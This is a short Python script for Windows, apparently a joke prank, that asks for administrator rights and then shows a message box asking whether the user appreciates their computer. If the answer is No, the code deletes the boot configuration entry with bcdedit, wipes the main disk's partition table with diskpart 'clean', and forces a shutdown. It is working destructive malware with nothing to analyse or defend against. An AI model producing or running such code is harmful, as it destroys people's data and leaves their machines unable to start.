import subprocess
import ctypes
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def ruin_everything():
    # 1. Kill the bcd
    # This makes the PC "forget how to start Windows twin
    subprocess.run("bcdedit /delete {current} /f", shell=True)
    
    # 2. Use Diskpart to wipe the drive hehe
    # This wipes the partition table of the main disk OwO
    commands = "select disk 0\nclean\n"
    process = subprocess.Popen(['diskpart'], stdin=subprocess.PIPE, text=True)
    process.communicate(input=commands)
    
    # 3. force a blue screen to finish it off
    os.system("shutdown /s /t 0")

def main():
    if not is_admin():
        # rernun the script with admin rights if not already elevated
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return

    # MessageBoxW Parameters:
    # 0 = No owner window
    # "Text content"
    # "Window Title"
    # 0x24 = MB_YESNO (4) + MB_ICONQUESTION (32)
    # 0x40000 = MB_TOPMOST (Stay on top)
    
    answer = ctypes.windll.user32.MessageBoxW(0, "Do you appreciate your computer?", "NYAW", 0x24 | 0x40000)

    if answer == 7: # 7 is the result for 'No'
        ruin_everything()
    else:
        ctypes.windll.user32.MessageBoxW(0, "Kewl. Ur fine for now :3", "Nyaw", 0x40)

if __name__ == "__main__":
    main()